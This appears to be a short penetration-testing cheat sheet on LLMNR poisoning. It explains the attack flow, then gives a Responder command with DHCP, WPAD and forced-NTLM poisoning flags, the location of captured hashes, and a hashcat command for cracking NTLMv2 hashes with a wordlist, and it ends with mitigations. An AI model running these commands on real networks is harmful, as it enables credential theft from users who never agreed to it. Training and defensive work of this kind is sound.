## Overview

**LLMNR (Link-Local Multicast Name Resolution)** is a protocol used when DNS fails. It broadcasts name queries to the local network, making it vulnerable to man-in-the-middle attacks.

## Attack Flow

1. Victim's DNS lookup fails
2. Victim broadcasts LLMNR query to network
3. Attacker responds: "I'm that host!"
4. Victim sends NTLMv2 hash to attacker

## Steps

### 1. Start Responder

BASH

`sudo responder -I tun0 -dwP`

|Flag|Purpose|
|---|---|
|`-I`|Interface|
|`-d`|DHCP poisoning|
|`-w`|WPAD rogue server|
|`-P`|Force NTLM auth for proxy|

### 2. Wait for Event

- User accesses non-existent share
- Misconfigured service
- Startup scripts pointing to dead hosts

### 3. Capture Hashes

Responder saves hashes to:

TEXT

`1/usr/share/responder/logs/ 2`

### 4. Crack Hashes

BASH

`1hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 2`

> `-m 5600` = NTLMv2

## Mitigations

- Disable LLMNR (Group Policy)
- Disable NBT-NS
- Require Network Access Control
- Use strong passwords (uncrackable)